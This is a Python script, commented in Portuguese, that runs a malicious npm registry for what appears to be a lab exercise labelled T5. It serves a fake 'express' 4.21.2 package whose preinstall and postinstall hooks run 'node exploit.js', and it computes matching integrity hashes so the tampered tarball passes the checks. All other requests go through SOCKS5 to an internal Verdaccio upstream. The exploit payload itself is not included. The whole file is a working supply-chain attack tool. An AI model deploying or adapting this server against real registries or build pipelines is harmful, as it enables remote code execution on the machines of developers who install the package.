#!/usr/bin/env python3
"""Registro npm de teste para o T5, com proxy para os pacotes não alterados."""

import argparse
import base64
import hashlib
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import requests


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--tarball", type=Path, required=True)
    parser.add_argument("--host-registro", required=True, help="Nome DNS desviado pelo laboratório")
    parser.add_argument("--upstream", required=True, help="URL do Verdaccio original, com IP interno")
    parser.add_argument("--socks", required=True, help="Proxy SOCKS5 para alcançar o upstream")
    parser.add_argument("--escuta", default="0.0.0.0")
    parser.add_argument("--porta", type=int, default=4873)
    args = parser.parse_args()

    arquivo = args.tarball.read_bytes()
    integridade = "sha512-" + base64.b64encode(hashlib.sha512(arquivo).digest()).decode()
    versao = "4.21.2"
    caminho_tgz = f"/express/-/express-{versao}.tgz"
    metadados = {
        "name": "express",
        "_id": "express",
        "dist-tags": {"latest": versao},
        "versions": {
            versao: {
                "name": "express",
                "version": versao,
                "hasInstallScript": True,
                "scripts": {"preinstall": "node exploit.js", "postinstall": "node exploit.js"},
                "dist": {
                    "tarball": f"http://{args.host_registro}:{args.porta}{caminho_tgz}",
                    "shasum": hashlib.sha1(arquivo).hexdigest(),
                    "integrity": integridade,
                },
            }
        },
    }

    class Handler(BaseHTTPRequestHandler):
        def responder(self, codigo: int, corpo: bytes, tipo: str) -> None:
            self.send_response(codigo)
            self.send_header("Content-Type", tipo)
            self.send_header("Content-Length", str(len(corpo)))
            self.end_headers()
            self.wfile.write(corpo)

        def atender(self) -> None:
            print(self.command, self.path, flush=True)
            if self.path in ("/express", "/express/"):
                self.responder(200, json.dumps(metadados).encode(), "application/json")
                return
            if self.path.startswith("/express/") and self.path.endswith(".tgz"):
                self.responder(200, arquivo, "application/octet-stream")
                return

            tamanho = int(self.headers.get("Content-Length", "0"))
            corpo = self.rfile.read(tamanho) if tamanho else None
            cabecalhos = {
                nome: valor
                for nome, valor in self.headers.items()
                if nome.lower() not in ("host", "content-length", "connection", "transfer-encoding")
            }
            sessao = requests.Session()
            sessao.trust_env = False
            sessao.proxies = {"http": args.socks}
            try:
                resposta = sessao.request(
                    self.command,
                    args.upstream.rstrip("/") + self.path,
                    headers=cabecalhos,
                    data=corpo,
                    timeout=20,
                )
                self.responder(
                    resposta.status_code,
                    resposta.content,
                    resposta.headers.get("Content-Type", "application/json"),
                )
            except requests.RequestException as erro:
                self.responder(502, str(erro).encode(), "text/plain")

        do_GET = atender
        do_POST = atender
        do_PUT = atender

    ThreadingHTTPServer((args.escuta, args.porta), Handler).serve_forever()


if __name__ == "__main__":
    main()
